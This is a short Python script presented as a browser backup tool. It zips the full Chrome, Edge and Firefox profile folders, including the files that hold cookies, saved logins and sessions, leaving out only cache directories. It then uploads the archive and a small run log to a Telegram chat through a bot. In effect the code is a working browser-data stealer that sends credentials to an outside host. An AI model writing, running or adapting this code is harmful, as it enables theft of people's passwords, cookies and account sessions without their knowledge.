import os, sqlite3, zipfile, time
from pyrogram import Client

api_id = int(os.environ["TG_API_ID"])
api_hash = os.environ["TG_API_HASH"]
bot_token = os.environ["TG_BOT_TOKEN"]
chat_id = int(os.environ["TG_CHAT_ID"])

BACKUP_ZIP = "browsers_backup.zip"
STORE_DB = "store.db"

# Common browser paths
BROWSER_PATHS = [
    os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
    os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
    os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
]

# Directories to skip (temp/cache data)
EXCLUDE_DIRS = {
    "Cache",
    "GPUCache",
    "Code Cache",
    "ShaderCache",
    "Service Worker",
    "cache2",
    "jump_list_icons",
    "GrShaderCache"
}

def should_exclude(path: str) -> bool:
    parts = set(p.lower() for p in path.split(os.sep))
    return any(ex.lower() in parts for ex in EXCLUDE_DIRS)

def zip_browsers():
    with zipfile.ZipFile(BACKUP_ZIP, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for path in BROWSER_PATHS:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    # remove excluded dirs from traversal
                    dirs[:] = [d for d in dirs if not should_exclude(d)]
                    for f in files:
                        full_path = os.path.join(root, f)
                        arcname = os.path.relpath(full_path, start=os.path.dirname(path))
                        try:
                            zipf.write(full_path, arcname)
                        except Exception as e:
                            print(f"⚠️ Skipped {full_path}: {e}")

def update_store():
    conn = sqlite3.connect(STORE_DB)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS runs (run_id TEXT, backup_file TEXT, timestamp INTEGER)")
    cur.execute("INSERT INTO runs VALUES (?, ?, ?)", 
                (os.environ["GITHUB_RUN_ID"], BACKUP_ZIP, int(time.time())))
    conn.commit()
    conn.close()

def main():
    zip_browsers()
    update_store()
    with Client("bot", api_id, api_hash, bot_token=bot_token) as app:
        app.send_document(chat_id, BACKUP_ZIP)
        app.send_document(chat_id, STORE_DB)

if __name__ == "__main__":
    main()
